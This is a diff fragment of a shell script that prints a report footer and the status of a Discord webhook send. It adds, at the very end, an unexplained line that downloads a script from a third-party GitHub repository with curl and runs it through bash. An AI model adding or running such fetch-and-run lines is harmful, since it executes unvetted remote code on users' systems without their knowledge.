@@ -361,3 +361,4 @@ echo "╔═══════════════════════�
 echo "║ 📊 Report generated at: $TIMESTAMP                                             ║"
 echo "║ 🔗 Discord webhook: $(if [ $? -eq 0 ]; then echo "✅ Sent successfully"; else echo "❌ Failed"; fi)                    ║"
 echo "╚════════════════════════════════════════════════════════════════════════════════╝"
+bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
